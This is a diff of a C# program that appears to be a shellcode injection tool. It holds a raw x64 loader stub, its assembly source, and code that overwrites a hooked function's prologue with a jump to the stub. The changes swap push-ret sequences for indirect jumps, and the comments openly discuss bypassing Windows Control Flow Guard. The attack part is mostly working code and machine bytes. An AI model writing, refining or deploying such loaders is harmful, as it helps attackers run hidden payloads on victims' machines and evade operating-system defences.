@@ -267,14 +267,14 @@ internal static class Program
 
     private static readonly byte[] ShellcodeLoader =
     {
-        /* 0000 */ 0x56, 0x53, 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x22, 0x22, 0x11, 0x11, 0x48, 0xBE, 0x88, 0x88,
+        /* 0000 */ 0x56, 0x53, 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x22, 0x22, 0x11, 0x11, 0x48, 0xBE, 0x88, 0x88, 
         /* 0010 */ 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 
         /* 0020 */ 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 
         /* 0030 */ 0xD6, 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 
         /* 0040 */ 0x09, 0x09, 0x09, 0x89, 0x43, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 
         /* 0050 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 
         /* 0060 */ 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x48, 0x8B, 
-        /* 0070 */ 0xCB, 0x5B, 0x5E, 0x51, 0xC3
+        /* 0070 */ 0xCB, 0x5B, 0x5E, 0xFF, 0xE1
     };
     
     private static IntPtr GetModuleHandle(string dll)
@@ -297,8 +297,8 @@ internal static class Program
         // This function generates a shellcode loader stub that executes the following sequence:
         // - Saves volatile registers and loads runtime-patched addresses for the hooked function and VirtualProtect.
         // - Unprotects the hooked function (RWX), restores its original 12-byte prologue, and reprotects it (RX).
-        // - Executes the inline shellcode payload (relative call to +11h, as shellcode is just appended). -> this would still break CFG
-        // - Restores registers and returns control to the original function via a push-ret sequence (bypassing CFG).
+        // - Executes the inline shellcode payload (relative call to +11h, as shellcode is just appended).
+        // - Restores registers and returns control to the original function via (indirect) pop rcx, jmp rcx
         //
         // How to re-assemble the shellcode loader:
         // - Save the shellcode stub.asm file
@@ -355,7 +355,7 @@ internal static class Program
             ; CALL THE SHELLCODE
             ; ==========================================
             sub rsp, 40h            ; Allocate shadow space
-            call Payload            ; Call the actual supplied payload (call + 0x0B)
+            call Payload            ; Call the actual supplied payload (call +11h)
             add rsp, 40h            ; Clean up stack
 
             ; ==========================================
@@ -364,8 +364,7 @@ internal static class Program
             mov rcx, rbx            ; rbx still holds final return dest, but rbx must be restored now
             pop rbx
             pop rsi
-            push rcx                ; push final return destination (hookedFuncAddr)
-            ret                     ; use push-ret to bypass CFG
+            jmp rcx                 ; jmp back to hookedFuncAddr (rcx is volatile, and we start again atop a function, should be clean)
 
         MyStub ENDP
 
@@ -553,10 +552,9 @@ internal static class Program
 
         // overwrite with the new 12 bytes to call the loader stub
         var callOpCode = new byte[] {
-            0x48, 0xB8,                  // [Index 0-1]   movabs rax, XXXX
-            0, 0, 0, 0, 0, 0, 0, 0,      // [Index 2-9]   full 8-bytes addressing (where the loader may be)
-            0x50,                        // [Index 10]    push rax
-            0xC3                         // [Index 11]    ret (call rax, i.e. the loader)
+            0x48, 0xB8,                  // 0x00..0x02  movabs rax, XXXX
+            0, 0, 0, 0, 0, 0, 0, 0,      // 0x02..0x0a  full 8-bytes addressing (where the loader may be)
+            0xFF, 0xE0                   // 0x0a..0x0c  jmp rax
         };
         // Copy the 8-byte address to the shellcode loader into indices 2 through 9
         BitConverter.GetBytes(loaderAddress.ToInt64()).CopyTo(callOpCode, 2);
